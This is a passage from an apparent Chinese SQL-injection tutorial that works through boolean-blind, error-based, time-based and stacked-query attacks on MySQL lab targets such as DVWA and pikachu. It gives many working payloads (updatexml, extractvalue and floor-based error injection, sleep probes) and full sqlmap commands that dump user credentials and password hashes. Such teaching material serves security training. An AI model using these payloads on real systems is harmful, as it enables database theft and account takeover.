class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在上面详细了说了布尔型盲注入的原理，在黑盒的模式下进行测试。</span><br><span class="line"></span><br><span class="line">首先判断注入</span><br><span class="line"></span><br><span class="line">判断完注入就获取数据库的长度</span><br><span class="line"></span><br><span class="line">得到长度再查询库名</span><br><span class="line"></span><br><span class="line">通过库名再查询表</span><br><span class="line"></span><br><span class="line">接着通过表查询字段</span><br><span class="line"></span><br><span class="line">最后查询某表指定的数据</span><br></pre></td></tr></table></figure><h5 id="布尔型盲注入查询长度"><a href="#布尔型盲注入查询长度" class="headerlink" title="布尔型盲注入查询长度"></a>布尔型盲注入查询长度</h5><p>要查询当前库名，首先确定要查询数据库的长度，再通过截取字符进行对比。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=4,1,0) --+</span><br></pre></td></tr></table></figure><p>判断库名的长度为 4，截取第一个字符再进行判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">A</span><br><span class="line">B</span><br><span class="line">C</span><br><span class="line">D</span><br><span class="line">E</span><br><span class="line">F</span><br><span class="line">G</span><br><span class="line">H</span><br><span class="line">I</span><br><span class="line">J</span><br><span class="line">K</span><br><span class="line">L</span><br><span class="line">M</span><br><span class="line">N</span><br><span class="line">O</span><br><span class="line">P</span><br><span class="line">Q</span><br><span class="line">R</span><br><span class="line">S</span><br><span class="line">T</span><br><span class="line">U</span><br><span class="line">V</span><br><span class="line">W</span><br><span class="line">X</span><br><span class="line">Y</span><br><span class="line">Z</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">e</span><br><span class="line">f</span><br><span class="line">g</span><br><span class="line">h</span><br><span class="line">i</span><br><span class="line">j</span><br><span class="line">k</span><br><span class="line">l</span><br><span class="line">m</span><br><span class="line">n</span><br><span class="line">o</span><br><span class="line">p</span><br><span class="line">q</span><br><span class="line">r</span><br><span class="line">s</span><br><span class="line">t</span><br><span class="line">u</span><br><span class="line">v</span><br><span class="line">w</span><br><span class="line">x</span><br><span class="line">y</span><br><span class="line">z</span><br><span class="line">@</span><br><span class="line">_</span><br></pre></td></tr></table></figure><p>每次都要与这些字符进行判断。最后得到 r是数据库名的第一个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring(database(),1,1)=&#x27;r&#x27;,1,0) --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring(database(),2,1)=&#x27;o&#x27;,1,0) --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring(database(),3,1)=&#x27;o&#x27;,1,0) --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring(database(),4,1)=&#x27;o&#x27;,1,0) --+</span><br></pre></td></tr></table></figure><p>如果数据库名很长呢？我们不知道怎么办</p><h5 id="burpsuite爆破库名"><a href="#burpsuite爆破库名" class="headerlink" title="burpsuite爆破库名"></a>burpsuite爆破库名</h5><p>拼接字符得到 root 库名</p><h5 id="得到库名接着获取表名"><a href="#得到库名接着获取表名" class="headerlink" title="得到库名接着获取表名"></a>得到库名接着获取表名</h5><p>原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)=&#x27;g&#x27;,1,0)</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1),1,1)=&#x27;g&#x27;,1,0) --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2),1,1)=&#x27;u&#x27;,1,0) --+</span><br></pre></td></tr></table></figure><p>在burpsuite中设置三个变量</p><p>limit 0，1    将0设置递归增加0-10</p><p>if（ss，1，1） 将1设置递归增加至40</p><p>字符a-z</p><h5 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h5><p>在用 burpsuite 抓包修改变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 0,1),1,1)=&#x27;u&#x27;,1,0) --+</span><br></pre></td></tr></table></figure><p>当前库的表的第一个列字符是否等于 u </p><p>如果等于 u 返回正则页面 否则返回错误页面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where user_id=1 and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; and TABLE_SCHEMA=database() limit 0,1),1,1)=&#x27;u&#x27;,1,0);</span><br></pre></td></tr></table></figure><p>半自动注入 跑就ok</p><p>首先跑查询账号和密码的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((SELECT LENGTH(CONCAT(user,0x3a,PASSWORD)) from users limit 1)=38,1,0) --+</span><br></pre></td></tr></table></figure><p>然后使用 burpsuie 获取账号和密码</p><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)--+</span><br></pre></td></tr></table></figure><p>burpsuite 抓包修改值 提交测试。</p><p>最后整理结果得出 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:5f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure><h3 id="报错型注入"><a href="#报错型注入" class="headerlink" title="报错型注入"></a>报错型注入</h3><p>数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息，例如语法错语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#x27;11064 - You have an error in your SQL syntax; check the manual that corresponds toyour MySQL server version for the right syntax to use near &#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>程序开发期间需要告诉使用者某些报错信息 方便管理员进行调试，</p><p>定位文件错误</p><p>特别 php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。</p><p>在 php 中 使用 mysql_error()函数。</p><p>如果 SQL 注入存在时，会有报错信息返回，可以采用报错注入。</p><h5 id="代码中分析"><a href="#代码中分析" class="headerlink" title="代码中分析"></a>代码中分析</h5><p>打开 dvwa 分析语句 </p><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220816095446355.png" alt="image-20220816095446355" style="zoom:80%;" /></p><p>如果语法错误，msqli_error()、mysqli_connect_error()会将语法错误信息 </p><p>显示到页面上</p><h5 id="SQL-报错注入攻击"><a href="#SQL-报错注入攻击" class="headerlink" title="SQL 报错注入攻击"></a><strong>SQL</strong> 报错注入攻击</h5><p>判断是否存在报错注入 </p><p>输入单引号 如果报错有可能存在报错注入，</p><p>如果拼接SQL 语句带入到 mysql 执行即存在报错注入。</p><p>输入 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and info() --+</span><br></pre></td></tr></table></figure><p> 就可以显示当前库</p><p>原理是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE user_id = &#x27;1&#x27; and info() </span><br></pre></td></tr></table></figure><p>会报错显示当前库不存在这个函数</p><p> 这样当前库名就显示在页面上。</p><h5 id="报错注入获取数据库敏感信息"><a href="#报错注入获取数据库敏感信息" class="headerlink" title="报错注入获取数据库敏感信息"></a>报错注入获取数据库敏感信息</h5><p>输入构造的攻击语句 页面返回数据库信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) --+</span><br></pre></td></tr></table></figure><p>把 user()替换成其他的函数 version() 、database() 就能得到 mysql 得版本信息和当前库名。</p><p>但是采用 updatexml 报错函数 只能显示 32 长度的内容</p><p>如果获取的内容超过 32字符就要采用字符串截取方法。</p><p>来每次获取 32 个字符串的长度</p><p>除了 updatexml 函数支持报错注入外，mysql 还有很多函数支持报错。</p><p>1.extractvalue()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,(select user()),0x7e))) --+</span><br></pre></td></tr></table></figure><p>2.exp()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure><p>等等</p><h5 id="其他函数介绍"><a href="#其他函数介绍" class="headerlink" title="其他函数介绍"></a>其他函数介绍</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select @@version),0x7e))</span><br></pre></td></tr></table></figure><p>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure><p>mysql对xml数据进行查询和修改的 xpath 函数，xpath 语法错误</p><p>上面两个需要传入xpath格式的字符串，但是传入的却不符合，但可以执行，所以报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span><br></pre></td></tr></table></figure><p>mysql 重复特性，此处重复了 version，所以报错，有些地方不管用</p><p>如果等号“=”被禁用了，可以使用like或&lt;&gt;替换，&lt;&gt;意思是不等于，在前面加上！意思就是等于，</p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(tablem_name) where !(table_schema &lt;&gt; security) </span><br></pre></td></tr></table></figure><h5 id="在黑盒模式下的报错注入"><a href="#在黑盒模式下的报错注入" class="headerlink" title="在黑盒模式下的报错注入"></a>在黑盒模式下的报错注入</h5><p>在黑盒模式下的报错注入 首先获取当前库，通过库获取表名</p><p>接着通过表名获取字段，最后获取字段内容。</p><h5 id="报错注入得到库名"><a href="#报错注入得到库名" class="headerlink" title="报错注入得到库名"></a>报错注入得到库名</h5><p>注入以后语句均可获取库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and info() --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) --+</span><br></pre></td></tr></table></figure><p>得到库名 root</p><h5 id="报错注入获取-mysql-账号和密码"><a href="#报错注入获取-mysql-账号和密码" class="headerlink" title="报错注入获取 mysql 账号和密码"></a>报错注入获取 <strong>mysql</strong> 账号和密码</h5><p>获取账号和密码需要 root 用户才有足够大的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select authentication_string from mysql.user limit 1;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select (updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))</span><br><span class="line">前32位</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))</span><br><span class="line">32到40位</span><br></pre></td></tr></table></figure><h5 id="报错注入获取表名"><a href="#报错注入获取表名" class="headerlink" title="报错注入获取表名"></a>报错注入获取表名</h5><p>通过 mysql 内置库 information_schema 通过构造 SQL 语句查询获取表名</p><p>采用 floor函数 报错</p><p>并不会存在长度问题</p><p>查询第一个表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure><p>将 LIMIT 0,1 改成 1,1 表是第二个表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure><h5 id="报错注入获取字段"><a href="#报错注入获取字段" class="headerlink" title="报错注入获取字段"></a>报错注入获取字段</h5><p>在获取表名之后就可以获取字段名，如获取 usrs 的字段名</p><p>获取第一个字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;users&#x27; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure><p>获取第二个字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;users&#x27; LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure><p>可以使用 burpsuite 批量对字段批量获取，首先抓包，修改变量，设置匹配规则。 </p><h5 id="报错注入获取信息"><a href="#报错注入获取信息" class="headerlink" title="报错注入获取信息"></a>报错注入获取信息</h5><p>现在已经获取 users 表的名字和它的字段名，接下来可以对内容进行查询。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure><p>如果存在多个用户 把 limit 0,1 改成 1,1 如此类推知道获取最后一个用户为止</p><p>使用 busrpsuite 对用户获取设置数量 再设置过滤网页响应内容。</p><p>获取库里 users 表所有用户的账号和密码。</p><p>updataxml函数  限制字数</p><p>floor函数   不限制字数</p><h3 id="时间延时型注入"><a href="#时间延时型注入" class="headerlink" title="时间延时型注入"></a>时间延时型注入</h3><p>时间注入又名延时注入，属于盲注入的一种</p><p>通常是某个注入点无法通过布尔型注入获取数据而采用一种突破注入的技巧</p><p>在 mysql 里 函数 sleep() 是延时的意思，sleep(10)就是 数据库延时 10 秒后返回内容。</p><p>判断注入可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=1 and sleep(10) </span><br></pre></td></tr></table></figure><p>数据库延时 10 秒返回值 网页响应时间至少要 10 秒 根据这个原理来判断存在 SQL 时间注入。</p><p>mysql 延时注入用到的函数 sleep() 、if()、substring()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(2&gt;1,sleep(10),0) </span><br></pre></td></tr></table></figure><p>2&gt;1 这个部分就是你注入要构造的 SQL 语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(length(database())&gt;1,sleep(5),0)</span><br></pre></td></tr></table></figure><p> 这个就是查询当前库名长度大于 1 就会延时 5 秒执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or if(length(database())&gt;1,sleep(5),0) --+ </span><br></pre></td></tr></table></figure><p>可以看到网页是大于五秒返回。根据这个原理 n&gt;1      n不延时就能确定当前数据库的长度了。 </p><h5 id="具体意思"><a href="#具体意思" class="headerlink" title="具体意思"></a>具体意思</h5><p>　　若网站执行了sql后，不管是否出错，都返回正常页面(不回显信息）。那么我们就不能通过返回的页面来指挥注入了。</p><p>　　此时就要用基于时间延迟的注入，使用sleep()函数来控制sql执行的时间。</p><p>​        从而判断我们的语句是否执行正确。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id = 1 and if (substring(version(),1,1)=5,1,sleep(5)) --+</span><br></pre></td></tr></table></figure><p>这条语句执行时，如果mysql版本不是5，则延时5秒，根据页面返回时长来判断数据库版本。</p><h5 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h5><p>　　时间注入是盲注入的一种，利用的场景是当目标无法使用布尔盲注获得数据时，就可以使用这种基于时间延迟的注入</p><p>　　利用语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(length(database())&gt;1,sleep(5),0 )</span><br></pre></td></tr></table></figure><p>　　这里的意思是数据库名的长度如果大于1就延时5秒返回结果</p><h5 id="sqlmap利用"><a href="#sqlmap利用" class="headerlink" title="sqlmap利用"></a>sqlmap利用</h5><h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">-u 表示检测的 url</span><br><span class="line"></span><br><span class="line">-p 指定的检测参数是哪一个</span><br><span class="line"></span><br><span class="line">http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2</span><br><span class="line"></span><br><span class="line">-p name </span><br><span class="line"></span><br><span class="line">-v 显示等级</span><br><span class="line">-v #详细的等级(0-6)</span><br><span class="line">0：只显示Python的回溯，错误和关键消息。</span><br><span class="line">1：显示信息和警告消息。</span><br><span class="line">2：显示调试消息。</span><br><span class="line">3：有效载荷注入。</span><br><span class="line">4：显示HTTP请求。</span><br><span class="line">5：显示HTTP响应头。</span><br><span class="line">6：显示HTTP响应页面的内容</span><br><span class="line"></span><br><span class="line">--technique=T  检测方法为时间注入</span><br><span class="line"></span><br><span class="line">--dbms mysql   指定检测数据库是mysql类型</span><br><span class="line"></span><br><span class="line">--threads 10   设置线程数</span><br><span class="line"></span><br><span class="line">--current-user 获取用户名</span><br><span class="line"></span><br><span class="line">--current-db   获取当前数据库名</span><br><span class="line"></span><br><span class="line">--batch        使用默认模式 自动确认Yes</span><br><span class="line"></span><br><span class="line">--tables -D 指定数据库  获取指定数据库的表名</span><br><span class="line"></span><br><span class="line">--columns 默认字典 -T 指定表名  获取指定表的字段名</span><br><span class="line"></span><br><span class="line">--dump 导出数据</span><br><span class="line"></span><br><span class="line">-C 指定查询的字段</span><br></pre></td></tr></table></figure><p>参数 —technique 用于指定检测注入时所用技术。</p><p>默认情况下 Sqlmap 会使用自己支持的全部技术进行检测。</p><p> 此参数后跟表示检测技术的大写字母，其值为 B、E、U、S、T 或Q</p><p>含义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">B：Boolean-based blind（布尔型注入）</span><br><span class="line"></span><br><span class="line">　　E：Error-based        （报错型注入）</span><br><span class="line"></span><br><span class="line">　　U：Union query-based  （可联合查询注入）</span><br><span class="line"></span><br><span class="line">　　S：Stacked queries    （可多语句查询注入）</span><br><span class="line"></span><br><span class="line">　　T：Time-based blind    （基于时间延迟注入）</span><br><span class="line"></span><br><span class="line">　　Q：Inline queries     （嵌套查询注入）</span><br></pre></td></tr></table></figure><p>　　可以用 “—technique ES”  来指定使用两种检测技术。”</p><p>​        —technique=BEUSTQ” 与默认情况等效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u  &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; --technique=B --banner</span><br></pre></td></tr></table></figure><p>sqlmap 设置时间盲注延迟时间：</p><p>用 <code>--time-sec 3</code> 参数设置基于时间延迟注入中延时时长，默认为 5 秒</p><h6 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name --technique=T -v 1 --dbms mysql </span><br></pre></td></tr></table></figure><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829143858098.png" alt=""></p><h6 id="列出库名"><a href="#列出库名" class="headerlink" title="列出库名"></a>列出库名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name --technique=T -v 1 --dbms mysql --current-user --current-db --threads 10 --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829144201531.png" alt=""></p><h6 id="列出表名"><a href="#列出表名" class="headerlink" title="列出表名"></a>列出表名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name --technique=T -v 1 --dbms mysql --tables -D pikachu --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829144510934.png" alt="image-20220829144510934"></p><h6 id="列出字段"><a href="#列出字段" class="headerlink" title="列出字段"></a>列出字段</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name --technique=T -v 1 --dbms mysql --columns -T users -D pikachu --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829144429972.png" alt="image-20220829144429972"></p><h6 id="列出数据"><a href="#列出数据" class="headerlink" title="列出数据"></a>列出数据</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name --technique=T --dump -v 1 --dbms mysql -C &quot;id,username,password&quot; -T users -D pikachu --threads 10 --batch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name -v 1 --technique=T --dump -C &quot;id,username,password&quot; -T users -D pikachu --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829144443813.png" alt="image-20220829144443813"></p><h3 id="堆叠查询型注入"><a href="#堆叠查询型注入" class="headerlink" title="堆叠查询型注入"></a>堆叠查询型注入</h3><p>堆叠查询：堆叠查询可以执行多条 SQL 语句，语句之间以分号(;)隔开</p><p>而堆叠查询注入攻击就是利用此特点，在第二条语句中构造要执行攻击的语句。</p><p>在SQL中，分号（;）是用来表示一条sql语句的结束。</p><p>在 ; 结束一个sql语句后继续构造下一条语句，会一起执行</p><p>在 mysql 里有以下函数执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_multi_query </span><br></pre></td></tr></table></figure><p>函数可以执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</p><p>但是堆叠查询只能返回第一条查询信息，不返回后面的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select version();select database()</span><br><span class="line"></span><br><span class="line">;show databases</span><br><span class="line"></span><br><span class="line">;show tables</span><br><span class="line"></span><br><span class="line">;show columns from tables</span><br></pre></td></tr></table></figure><p>堆叠注入的危害是很大的 可以任意使用增删改查的语句，</p><p>例如删除数据库 修改数据库，添加数据库用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">备注：堆叠注入的可以运用于创建用户由于我们使用网站用户进行注入不能查看到数据库的密码但是我们可以创建用户来登录迂回的注入数据库</span><br><span class="line">但是前提是网站的管理员必须是高权限才能完全创建用户</span><br><span class="line">也可以使用update更新管理员用户密码。</span><br></pre></td></tr></table></figure><h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>靶场启动</p><p>在堆叠注入页面中，程序获取 